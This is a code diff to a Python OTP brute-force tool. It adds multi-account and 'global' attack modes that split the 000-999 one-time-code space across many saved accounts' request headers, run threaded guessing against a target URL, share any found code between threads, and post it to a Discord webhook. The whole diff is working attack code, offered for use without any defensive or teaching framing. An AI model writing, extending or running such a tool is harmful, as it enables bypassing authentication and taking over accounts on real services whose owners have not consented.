@@ -137,6 +137,10 @@ def run_attack_core(target_url, target_headers, num_threads, cooldown, account_n
     
     found_otp = [None]  # Use list to allow modification in closure
     
+    # Sync coordination - only ONE thread should perform the sync
+    sync_lock = threading.Lock()
+    sync_done = [False]  # Flag to track if sync has been attempted
+    
     # Generate Sequential List for assigned range
     all_otps = [f"{i:03d}" for i in range(range_start, range_end)]
     
@@ -152,6 +156,13 @@ def run_attack_core(target_url, target_headers, num_threads, cooldown, account_n
                 global_otp = shared_context['found_otp']
                 # If we haven't found it locally yet, try to use the global one
                 if not found_otp[0]:
+                    # Only ONE thread should attempt sync - others just exit
+                    with sync_lock:
+                        if sync_done[0]:
+                            # Another thread is already syncing, just exit
+                            return
+                        sync_done[0] = True  # Claim the sync task
+                    
                     with print_lock:
                          print(font(f" [{account_name}] [Thread {thread_id}] detected Global Found OTP: {global_otp}. Syncing...", color="magenta"))
                     
@@ -391,8 +402,12 @@ def load_config_from_file(file_path):
         print(font(f" [Config] Error reading {file_path}: {e}", color="red"))
     return None, None
 
-def run_multi_account_attack():
-    """Concurrently iterates through Input/SavedRequests and runs attack for each."""
+def run_multi_account_attack(selected_files=None):
+    """Concurrently iterates through Input/SavedRequests and runs attack for each.
+    
+    Args:
+        selected_files: Optional list of filenames to attack. If None, uses all files.
+    """
     saved_requests_dir = os.path.join(os.getcwd(), 'Input', 'SavedRequests')
     
     if not os.path.exists(saved_requests_dir):
@@ -400,7 +415,11 @@ def run_multi_account_attack():
         input(" Press Enter to return...")
         return
 
-    files = [f for f in os.listdir(saved_requests_dir) if f.endswith('.txt')]
+    # Use selected files if provided, otherwise get all files
+    if selected_files is not None:
+        files = selected_files
+    else:
+        files = [f for f in os.listdir(saved_requests_dir) if f.endswith('.txt')]
     
     if not files:
         print(font(" [INFO] No saved requests found in Input/SavedRequests.", color="yellow"))
@@ -408,9 +427,9 @@ def run_multi_account_attack():
         return
         
     count_accounts = len(files)
-    print(font(f"\n Found {count_accounts} accounts to attack.", color="cyan", inverse=True))
+    print(font(f"\n Attacking with {count_accounts} account(s).", color="cyan", inverse=True))
     for f in files:
-        print(f" - {f}")
+        print(f" - {os.path.splitext(f)[0]}")
         
     # Ask for settings once
     try:
@@ -498,6 +517,119 @@ def run_multi_account_attack():
         t.join(timeout=5.0) # Give them time to clean up
         
     print(font("\n === Multi-Account Attack Summary === ", color="green", inverse=True))
+    for filename in files:
+        acc = os.path.splitext(filename)[0]
+        res = results.get(acc, "Unknown/Cancelled")
+        color = "green" if res != "Failed" and "Failed" not in str(res) and "Cancelled" not in str(res) else "red"
+        print(font(f" {acc}: {res}", color=color))
+
+    input("\n Press Enter to return to menu...")
+
+
+def run_global_attack(files, temp_dir, num_threads, cooldown, webhook_url=None):
+    """
+    Run a global attack using configs from a temporary directory.
+    Similar to multi-account but for cloud-synced users.
+    
+    Args:
+        files: List of filenames to attack
+        temp_dir: Directory containing the temp config files
+        num_threads: Threads per account
+        cooldown: Cooldown per thread
+        webhook_url: Optional Discord webhook for OTP notifications
+    """
+    count_accounts = len(files)
+    print(font(f"\n Global Attack with {count_accounts} user(s).", color="red", inverse=True))
+    
+    # Divide global range (1000) by number of accounts
+    total_otps = 1000
+    range_per_account = total_otps // count_accounts
+    
+    print(font(f" Strategy: Distributed 000-999 across {count_accounts} users.", color="magenta"))
+    print(font(" Press 'q' or 'esc' to stop ALL attacks.", color="yellow"))
+    
+    shared_stop_event = threading.Event()
+    shared_print_lock = threading.Lock()
+    
+    # Shared context to store the found OTP
+    shared_context = {'found_otp': None, 'found_by': None}
+    
+    results = {}
+    
+    # Wrapper helper to run in thread and capture result
+    def attack_wrapper(acc_name, conf_url, conf_headers, start_r, end_r):
+        res = run_attack_core(conf_url, conf_headers, num_threads, cooldown, 
+                              account_name=acc_name, 
+                              stop_event=shared_stop_event, 
+                              print_lock=shared_print_lock,
+                              range_start=start_r,
+                              range_end=end_r,
+                              shared_context=shared_context)
+        results[acc_name] = res if res else "Failed"
+        
+        # If this account found the OTP, record who found it
+        if res and not shared_context.get('found_by'):
+            shared_context['found_by'] = acc_name
+
+    account_threads = []
+
+    for i, filename in enumerate(files):
+        file_path = os.path.join(temp_dir, filename)
+        account_name = os.path.splitext(filename)[0]
+        
+        # Calculate range for this account
+        start_r = i * range_per_account
+        # Last account grabs the remainder up to 1000
+        end_r = (i + 1) * range_per_account if i < count_accounts - 1 else total_otps
+        
+        url, headers = load_config_from_file(file_path)
+        
+        if not url or not headers:
+            with shared_print_lock:
+                print(font(f" [SKIP] Could not load config for {account_name}", color="red"))
+            results[account_name] = "Failed to load config"
+            continue
+            
+        t = threading.Thread(target=attack_wrapper, args=(account_name, url, headers, start_r, end_r))
+        t.daemon = True
+        account_threads.append(t)
+        t.start()
+        
+        # Stagger starts slightly to avoid instantaneous blast
+        time.sleep(0.1)
+
+    # Main monitoring loop for cancellation
+    try:
+        while any(t.is_alive() for t in account_threads):
+            if keyboard.is_pressed('q') or keyboard.is_pressed('esc'):
+                with shared_print_lock:
+                    print(font("\n\n [!] Stopping All Attacks... ", color="red", inverse=True))
+                shared_stop_event.set()
+                break # Break monitor loop, wait for threads to join
+            time.sleep(0.1)
+    except KeyboardInterrupt:
+        with shared_print_lock:
+            print(font("\n\n [!] Keyboard Interrupt. Stopping... ", color="red", inverse=True))
+        shared_stop_event.set()
+
+    # Wait for all account threads
+    for t in account_threads:
+        t.join(timeout=5.0)
+    
+    # Send Discord notification if OTP was found
+    if shared_context.get('found_otp') and webhook_url:
+        try:
+            import global_attack as ga
+            ga.send_otp_found_notification(
+                webhook_url, 
+                shared_context['found_otp'], 
+                shared_context.get('found_by', 'Unknown')
+            )
+            print(font(" [Discord] OTP notification sent!", color="magenta"))
+        except Exception as e:
+            print(font(f" [Discord] Failed to send notification: {e}", color="yellow"))
+        
+    print(font("\n === Global Attack Summary === ", color="green", inverse=True))
     for filename in files:
         acc = os.path.splitext(filename)[0]
         res = results.get(acc, "Unknown/Cancelled")
